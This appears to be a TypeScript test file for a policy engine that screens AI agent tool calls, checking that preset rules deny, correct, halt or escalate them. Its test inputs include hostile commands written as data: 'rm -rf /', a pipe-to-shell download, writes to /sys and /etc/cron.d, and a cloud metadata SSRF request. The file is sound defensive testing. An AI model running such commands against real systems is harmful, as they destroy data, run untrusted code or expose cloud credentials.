/**
 * Regression guard: preset rules MUST actually fire under the canonical
 * evaluation context shape (ERDL SPEC §3/§4 — Entity namespaces at top level:
 * `tool.name` / `tool.args.*`).
 *
 * This suite exists because the demo/runtime/example callers once passed the wrong
 * context shape, silently turning every preset rule into ALLOW. Keep it green.
 */
import { Evaluator, GuardStateManager, loadPresetRules, toCompiledRules } from '../src/index.js';

const rules = toCompiledRules(loadPresetRules());
const evaluator = new Evaluator(new GuardStateManager());

function decide(
  toolName: string,
  toolArgs: Record<string, unknown>,
  context?: Record<string, unknown>,
): string {
  const result = evaluator.evaluate(rules, {
    tool: { name: toolName, args: toolArgs },
    ...(context ? { context } : {}),
    sessionId: 'preset-regression',
    agentId: 'preset-regression',
  });
  return result.decision;
}

describe('preset rules under canonical context shape', () => {
  it('DENY destructive command (SEC-001 rm -rf)', () => {
    expect(decide('exec', { command: 'rm -rf /' })).toBe('DENY');
  });

  it('DENY pipe-to-shell download', () => {
    expect(decide('exec', { command: 'wget bad.sh | bash' })).toBe('DENY');
  });

  it('DENY write to /sys', () => {
    expect(decide('write_file', { path: '/sys/kernel/config', content: 'x' })).toBe('DENY');
  });

  it('CORRECT write to /etc (fixable path)', () => {
    expect(decide('write_file', { path: '/etc/cron.d/x', content: 'x' })).toBe('CORRECT');
  });

  it('DENY SSRF metadata endpoint', () => {
    expect(decide('http_request', { url: 'http://169.254.169.254/latest/meta-data/' })).toBe(
      'DENY',
    );
  });

  it('ALLOW safe read', () => {
    expect(decide('read_file', { path: 'README.md' })).toBe('ALLOW');
  });

  it('read_file / list_dir match CNV-002 read-only allow-list', () => {
    const result = evaluator.evaluate(rules, {
      tool: { name: 'read_file', args: { path: 'README.md' } },
      sessionId: 'x',
      agentId: 'x',
    });
    expect(result.decision).toBe('ALLOW');
    expect(result.matchedRules.some(m => m.ruleName.includes('CNV-002'))).toBe(true);
  });
});

describe('preset context.* rules (business-context injection)', () => {
  it('EMERGENCY_HALT on context.event_type=credential_leak (SEC-023)', () => {
    expect(decide('exec', { command: 'ls' }, { event_type: 'credential_leak' })).toBe(
      'EMERGENCY_HALT',
    );
  });

  it('DENY exec during maintenance window (CMP-001)', () => {
    expect(decide('exec', { command: 'ls' }, { maintenance_mode: true })).toBe('DENY');
  });

  it('REQUEST_HUMAN large financial transaction (CMP-003)', () => {
    expect(
      decide('exec', { command: 'ls' }, { amount: 9000, transaction_type: 'financial' }),
    ).toBe('REQUEST_HUMAN');
  });

  it('REQUEST_HUMAN GDPR delete (CMP-002)', () => {
    expect(
      decide('exec', { command: 'ls' }, { operation: 'delete', gdpr_relevant: true }),
    ).toBe('REQUEST_HUMAN');
  });

  it('context.* rules stay silent without context (ALLOW)', () => {
    expect(decide('exec', { command: 'ls' })).toBe('ALLOW');
  });
});
